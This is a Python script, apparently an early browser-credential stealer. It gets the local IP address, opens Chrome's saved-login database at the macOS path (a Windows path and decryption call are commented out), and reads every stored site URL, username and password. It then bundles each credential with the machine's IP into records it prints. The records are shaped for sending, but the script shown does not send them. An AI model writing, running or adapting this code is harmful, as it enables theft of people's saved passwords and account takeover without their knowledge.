# imports 
import requests
import os 
import sqlite3
import shutil
import csv
import socket
# windows os 
# import win32crypt

# def get_country_from_ip(ip_address):
#     try:
#         # Make a request to the ipinfo.io API
#         response = requests.get(f'https://ipinfo.io/{ip_address}/json')
        
#         # Check if the request was successful (status code 200)
#         if response.status_code == 200:
#             ip_data = response.json()
            
#             # Extract the country information
#             country = ip_data.get('country', 'Country information not available')
            
#             return country
#         else:
#             return f'Error: {response.status_code}'
#     except requests.RequestException as e:
#         return f'Error: {e}'

# Replace '8.8.8.8' with the IP address you want to look up
# ip_address_to_lookup = '8.8.8.8'
# country = get_country_from_ip(ip_address_to_lookup)

# print(f'The country for IP address {ip_address_to_lookup} is: {country}')

def get_local_ip():
    try:
        # Get the local hostname
        host_name = socket.gethostname()

        # Get the local IP address
        local_ip = socket.gethostbyname(host_name)

        return local_ip
    except socket.error as e:
        print(f"Error: {e}")
        return None

local_ip = get_local_ip()

if local_ip:
    print(f"Local IP address: {local_ip}")
    
else:
    print("Unable to retrieve local IP address.")

def get_chrome():
    # windows os 
    # data_path = os.path.expanduser("~") + r"/AppData/Local/Google/Chrome/User Data/Default/Login Data"

    data_path = os.path.expanduser("~") + r"/Library/Application Support/Google/Chrome/Default/Login Data"

    # django file location
    # BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    # data_path = os.path.join(BASE_DIR, "Library/Application Support/Google/Chrome/Default/Login Data")

    
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = "SELECT origin_url, username_value , password_value FROM logins"
    cursor.execute(select_statement)
    login_data = cursor.fetchall()
    cred = {}
    string = ""
    data_record = []
    for url , user_name , pwd in login_data:
        # windoes os
        # pwd = win32crypt.CryptUnprotectData(pwd)
        # cred[url] = (user_name, pwd[1].decode("utf-8"))

        cred[url] = (user_name, pwd.decode("latin-1"))
        string += "\n[+] URL:%s \n USERNAME:%s \n PASSWORD:%s\n" % (url, user_name, pwd.decode("latin-1"))

        data = {
            "ipadress_data": local_ip,
            "url_data":url,
            "username_data":user_name,
            "password_data":pwd.decode("latin-1")
        }

        data_record.append(data)

     
    print(data_record)

if __name__ == "__main__":
    get_chrome()



# def get_test():

#     BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
#     data_path = os.path.join(BASE_DIR, "Library/Application Support/Google/Chrome/Default/Login Data")

#     # Use SQLite connection for Chrome database
#     with sqlite3.connect(data_path) as conn:
#         cursor = conn.cursor()
#         select_statement = "SELECT origin_url, username_value, password_value FROM logins"
#         cursor.execute(select_statement)

#         # Fetch and print data for testing
#         rows = cursor.fetchall()
#         for row in rows:
#             print(row)
